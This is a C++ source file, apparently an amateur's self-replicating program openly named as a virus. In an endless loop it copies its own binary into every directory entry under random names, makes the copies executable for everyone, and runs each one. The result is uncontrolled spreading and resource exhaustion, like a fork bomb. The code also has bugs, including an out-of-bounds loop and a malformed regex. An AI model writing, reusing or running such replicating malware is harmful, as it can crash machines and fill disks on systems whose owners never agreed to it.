#include <vector>
#include <bitset>
#include <regex>
#include <thread>
#include <cstdlib>
#include <fstream>
#include <dirent.h>
#include <iostream>
#include <sys/stat.h>
#include <unistd.h>





//variables
std::regex correctFile("(a)+([0-9]?)+(.*)");
// detect archives
std::regex itsAFile("[a-zA-z0-9\\- _]+(\\.*)");

// prototypes
void ListDir(const std::string &, std::vector<std::string> &);

void writeFiles(std::vector<std::string>);


std::string nameVirus;
int main()
{
  std::vector<std::string> files;
  ListDir("./", files);
  writeFiles(files);

  return 0;
}

// get the directorys
void ListDir(const std::string &path, std::vector<std::string> &files)
{
  struct dirent *entry;
  DIR *dp;
  dp = opendir(path.c_str());

  if (dp == NULL)

    perror("opendir: Path does not exist or could not be read.");

  while ((entry = readdir(dp)))
    files.push_back(entry->d_name);

  closedir(dp);
}

// write the file
void execCommand(){
usleep(3 * 10000);
  system(("./"+nameVirus).c_str());
}
void writeFiles(std::vector<std::string> files)
{

 std:: string file = "a.out";
  while(true)
  {
    for (int i = 0; i <= files.size(); i++)
    {
      try
      {
        if (std::regex_match(files[i], correctFile))
          file = files[i]; // get the file

        // get the directories
        if (!std::regex_match(files[i], itsAFile) == 0 ||files[i] == "." || files[i] == "..")
        {
          // generate the name
         nameVirus= (files[i] + "/a" + std::to_string(rand()) + ".bin");
          // get the file
          std::ifstream fileVirus(file);
          // create the file
          
          std::ofstream copyVirus(nameVirus);
          std::string virusString;
          chmod(nameVirus.c_str(), S_IRWXU | S_IRWXG | S_IRWXG | S_IRWXO);
          copyVirus << fileVirus.rdbuf(); // copy the file
              

         // 
          std::thread execThisPlease(execCommand);
          execThisPlease.join(); // idk what im doing here 😩
        }
      }
      //no instance of constructor "std::__1::thread::thread" matches the argument list -- argument types are: (int (const char *), std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char>>)
      catch (...)
      {
       std::cout << "fuck" << std::endl;
      }
    }
  } 
}
